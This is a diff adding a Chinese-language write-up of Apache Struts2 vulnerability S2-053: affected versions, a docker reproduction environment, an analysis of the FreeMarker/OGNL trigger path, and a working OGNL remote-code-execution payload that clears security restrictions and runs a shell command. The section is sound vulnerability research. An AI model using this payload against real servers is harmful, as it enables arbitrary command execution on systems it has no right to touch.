@@ -1149,15 +1149,65 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO "/bin/bash
 <a name="s2-053"></a>
 ## S2-053
 
+官方漏洞公告：https://cwiki.apache.org/confluence/display/WW/S2-053
+
+影响版本：`Struts 2.0.0` - `Struts 2.3.33`, `Struts 2.5` - `Struts 2.5.10.1`
+
 ## 漏洞复现与分析
 
+从漏洞公告可获悉：在FreeMarker模板中使用struts2标签库时，如果使用了表达式`${}`去引用可控输入时，便会导致RCE攻击。
 
+下面使用docker镜像`medicean/vulapps:s_struts2_s2-053`进行调试分析。该环境使用的是Struts2 `2.5.10.1`版本。
 
+在该环境中，`Index.action`的返回页面使用FreeMarker模板去渲染。在freemarker模板文件`index.ftl`里使用了struts2标签`s:url`，即`@s.url`，且该标签的`value`属性引用了外界可控输入的`name`参数的值。代码如下：
+
+<img src="pic/struts2_s2-053_2.png">
+
+<img src="pic/struts2_s2-053_3.png">
+
+简单执行OGNL表达式如下：
+
+<img src="pic/struts2_s2-053_4.png">
+
+由于漏洞触发是在Struts2处理返回页面，即`Result`对象阶段。因此在`DefaultInvocation`开始调度`Result`对象处，以及`OgnlValueStack#findValue()`方法处下断点，便可知道漏洞触发执行的调用栈。
+
+由于`Index.action`的`result`标签的`type`属性为`freemarker`，所以`DefaultInvocation`调度的`Result`对象其实是`FreemarkerResult`，它会根据模板文件创建对应的模板对象`Template`来进行一系列的解析渲染操作。在这个过程中，它先是解析表达式`${name}`获取`name`参数的值，然后对值进行OGNL表达式的计算。关键代码如下：
+
+<img src="pic/struts2_s2-053_5.png">
+   
+<img src="pic/struts2_s2-053_6.png">
+  
+<img src="pic/struts2_s2-053_7.png">
+  
+<img src="pic/struts2_s2-053_8.png">
+  
 ### 可回显PoC
 
+拿S2-045的exploit稍微修改一下便可：
+```
+%{
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#_memberAccess?(#_memberAccess=#dm):
+		(
+		(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+		(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+		(#ognlUtil.getExcludedPackageNames().clear()).
+		(#ognlUtil.getExcludedClasses().clear()).
+		(#context.setMemberAccess(#dm)))).
+(#cmd='id').
+(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
+(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
+(#p=new java.lang.ProcessBuilder(#cmds)).
+(#p.redirectErrorStream(true)).
+(#process=#p.start()).
+(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))
+}
+```
 
+<img src="pic/struts2_s2-053_1.png">
 
 ## 漏洞修复
+
 
 
 <a name="s2-057"></a>
